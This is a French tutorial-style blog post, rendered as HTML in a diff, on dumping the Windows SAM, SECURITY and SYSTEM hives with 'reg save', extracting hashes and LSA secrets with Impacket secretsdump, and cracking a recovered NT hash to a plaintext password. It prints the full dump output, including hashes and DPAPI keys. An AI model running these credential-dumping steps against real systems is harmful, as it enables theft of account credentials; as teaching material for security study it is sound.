@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Intro La base SAM (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous HKEY_LOCAL_MACHINE\\SAM, qui gère les comptes utilisateurs locaux, groupes et hashs NTLM des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus LSASS (lsass.exe) pour authentifier les sessions locales.\nMalgré son rôle critique, sa sécurité est faible : accessible uniquement en privilèges SYSTEM ou admin, elle s&rsquo;extrait facilement via reg save hklm\\sam après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.\n">
+<title>Dump base SAM</title>
+
+<link rel='canonical' href='http://localhost:1313/p/dump-base-sam/'>
+
+<link rel="stylesheet" href="/scss/style.min.b0e76e98cdd4f7082d1fc36f7af7e0843a81201db2197c03ca426751dc923735.css"><meta property='og:title' content="Dump base SAM">
+<meta property='og:description' content="Intro La base SAM (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous HKEY_LOCAL_MACHINE\\SAM, qui gère les comptes utilisateurs locaux, groupes et hashs NTLM des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus LSASS (lsass.exe) pour authentifier les sessions locales.\nMalgré son rôle critique, sa sécurité est faible : accessible uniquement en privilèges SYSTEM ou admin, elle s&rsquo;extrait facilement via reg save hklm\\sam après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.\n">
+<meta property='og:url' content='http://localhost:1313/p/dump-base-sam/'>
+<meta property='og:site_name' content='KIRÔN'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Registre' /><meta property='article:tag' content='SAM' /><meta property='article:tag' content='secretsdump' /><meta property='article:tag' content='Python' /><meta property='article:tag' content='Windows' /><meta property='article:published_time' content='2026-03-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-05T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Dump base SAM">
+<meta name="twitter:description" content="Intro La base SAM (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous HKEY_LOCAL_MACHINE\\SAM, qui gère les comptes utilisateurs locaux, groupes et hashs NTLM des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus LSASS (lsass.exe) pour authentifier les sessions locales.\nMalgré son rôle critique, sa sécurité est faible : accessible uniquement en privilèges SYSTEM ou admin, elle s&rsquo;extrait facilement via reg save hklm\\sam après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.\n">
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Afficher le menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/enzo-anime_hu_6e79a1c3b52c56b8.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">KIRÔN</a></h1>
+            <h2 class="site-description">Mes notes en forensic</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/enzo-ribeiro'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/enzo-ribeiro-bb8794209/'
+                        target="_blank"
+                        title="LinkedIn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="#000000" width="800px" height="800px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.975,20.667H3.117V9.059H6.975ZM5.072,3.462a2.011,2.011,0,1,0-.051,4.012h.026a2.012,2.012,0,1,0,.025-4.012ZM9.111,20.667h3.858V14.185a2.639,2.639,0,0,1,.127-.941,2.111,2.111,0,0,1,1.98-1.411c1.4,0,1.955,1.064,1.955,2.625v6.209h3.858V14.011c0-3.565-1.9-5.225-4.442-5.225A3.828,3.828,0,0,0,12.97,10.7V9.059H9.111c.051,1.089,0,11.609,0,11.609Z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" selected>Français</option>
+                                
+                                    <option value="http://localhost:1313/zh-cn/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Mode sombre</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table des matières</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/red-team/" >
+                Red Team
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/dump-base-sam/">Dump base SAM</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-03-05T00:00:00Z'>mars 05, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minutes de lecture
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="intro">Intro
+</h2><p>La <strong>base SAM</strong> (Security Account Manager) est la base de données locale de Windows, stockée dans le registre sous <code>HKEY_LOCAL_MACHINE\SAM</code>, qui gère les comptes utilisateurs locaux, groupes et <strong>hashs NTLM</strong> des mots de passe. Au démarrage, elle est chargée en arrière-plan et interrogée par le processus <strong>LSASS</strong> (<code>lsass.exe</code>) pour authentifier les sessions locales.</p>
+<p>Malgré son rôle critique, sa <strong>sécurité est faible</strong> : accessible uniquement en privilèges <strong>SYSTEM</strong> ou admin, elle s&rsquo;extrait facilement via <code>reg save hklm\sam</code> après élévation (PsExec, Mimikatz), puis les hashs NT se craquent offline par brute force ou dictionnaire (Impacket, samdump2). Sans protections avancées comme Credential Guard, un attaquant admin compromet tout en quelques commandes.</p>
+<h2 id="exploitation">Exploitation
+</h2><p>Après une élévation de privilège (pas forcément nécessaire si le compte que nous avons dipose des droits : <code>SeBackupPrivilege</code>) nous pouvons exécuté les commandes suivantes :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg save HKLM\SAM &#34;C:\Windows\Temp\sam.save&#34;
+</span></span><span class="line"><span class="cl">reg save HKLM\SECURITY &#34;C:\Windows\Temp\security.save&#34;
+</span></span><span class="line"><span class="cl">reg save HKLM\SYSTEM &#34;C:\Windows\Temp\system.save&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Une fois extraite nous pouvons nous rendre dans le dossier Temp pour vérifier que les registre y sont bien :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\Windows\Temp&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Répertoire : C:\Windows\Temp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----        05/03/2026     14:40          53248 sam.save
+</span></span><span class="line"><span class="cl">-a----        05/03/2026     14:40          32768 security.save
+</span></span><span class="line"><span class="cl">-a----        05/03/2026     14:40       11071488 system.save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nous pouvons donc maintenant les transférer les &ldquo;BackUp&rdquo; vers notre machine, de mon côté j&rsquo;utilise <code>temp.sh</code>.</p>
+<p>Une fois dans notre machine (exegol pour moi), il faut rentrer cette commande :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump -sam sam.save -system system.save -security security.save LOCAL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0xf506f5839ff1b3bca4cb9085cc49bd63
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping <span class="nb">local</span> SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8aac1c783ea7d4cd131375a0be698448:::
+</span></span><span class="line"><span class="cl">kiron:1001:aad3b435b51404eeaad3b435b51404ee:ac67fa8a30aa36b5a06b5fb8ce4c01f1:::
+</span></span><span class="line"><span class="cl">root:1002:aad3b435b51404eeaad3b435b51404ee:93dde96f43d7462ef36fbea2e64265af:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping cached domain logon information <span class="o">(</span>domain/username:hash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping LSA Secrets
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> DPAPI_SYSTEM
+</span></span><span class="line"><span class="cl">dpapi_machinekey:0x77b195bed94b8ad49b5ac0a3a596caa05fd1a3e9
+</span></span><span class="line"><span class="cl">dpapi_userkey:0x68170a5d34618129a51bf5514b82a29923487300
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NL<span class="nv">$KM</span>
+</span></span><span class="line"><span class="cl"> <span class="m">0000</span>   E9 <span class="m">51</span> D4 <span class="m">37</span> <span class="m">00</span> 7D A3 <span class="m">55</span>  AF E9 <span class="m">75</span> AB F8 AC BD 6C   .Q.7.<span class="o">}</span>.U..u....l
+</span></span><span class="line"><span class="cl"> <span class="m">0010</span>   <span class="m">12</span> D0 2A EE <span class="m">86</span> 0E C4 EB  <span class="m">92</span> <span class="m">79</span> <span class="m">20</span> <span class="m">08</span> F9 <span class="m">56</span> ED FE   ..*......y ..V..
+</span></span><span class="line"><span class="cl"> <span class="m">0020</span>   <span class="m">00</span> <span class="m">91</span> F1 6D <span class="m">39</span> 7C B1 AA  0D <span class="m">60</span> <span class="m">64</span> C3 FC D0 D3 B0   ...m9<span class="p">|</span>...<span class="sb">`</span>d.....
+</span></span><span class="line"><span class="cl"> <span class="m">0030</span>   <span class="m">56</span> D4 <span class="m">78</span> ED 4C CF <span class="m">70</span> B4  D7 B2 E6 F9 <span class="m">40</span> <span class="m">64</span> <span class="m">20</span> <span class="m">33</span>   V.x.L.p.....@d <span class="m">3</span>
+</span></span><span class="line"><span class="cl">NL<span class="nv">$KM</span>:e951d437007da355afe975abf8acbd6c12d02aee860ec4eb92792008f956edfe0091f16d397cb1aa0d6064c3fcd0d3b056d478ed4ccf70b4d7b2e6f940642033
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici l&rsquo;identifiant qui m&rsquo;intéresse c&rsquo;est <code>root</code>, je peux donc prendre  le Hash NT te le mettre dans <code>CrackStation</code> :
+![[Pasted image 20260305145659.png]]</p>
+<p>Nous pouvons voir ici que le mot de passe est <code>diamond1</code>.</p>
+<p>Il est également possible de cracké le mot de passe avec hashcat.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/registre/">Registre</a>
+        
+            <a href="/tags/sam/">SAM</a>
+        
+            <a href="/tags/secretsdump/">Secretsdump</a>
+        
+            <a href="/tags/python/">Python</a>
+        
+            <a href="/tags/windows/">Windows</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenus liés</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/rubber-ducky-pour-2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Rubber Ducky pour 2€</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Enzo Ribeiro
+    </section>
+    
+    <section class="powerby">
+        Généré avec <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Thème <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.32.0">Stack</a></b> conçu par <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e4dd2d7a791b3794ae9889b21f5598875c8169002592e3d7b6a9ed269f54068.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
